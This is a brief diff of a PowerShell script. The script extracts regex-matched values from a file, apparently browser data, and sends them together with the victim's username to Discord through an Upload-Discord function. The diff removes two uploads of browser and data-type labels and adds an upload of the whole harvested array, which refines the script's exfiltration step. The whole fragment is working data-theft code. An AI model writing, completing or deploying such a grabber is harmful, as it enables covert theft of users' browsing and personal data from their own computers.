@@ -27,8 +27,6 @@ $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matc
 $array = New-Object Collections.Generic.List[String]
 $counter = 0
 Upload-Discord -text $env:UserName
-Upload-Discord -text $Browser
-Upload-Discord -text $DataType
 $Value | ForEach-Object {
 	$counter += 1
 	$Key = $_
@@ -50,3 +48,4 @@ $Value | ForEach-Object {
 	}
 	
 }
+Upload-Discord -text $array
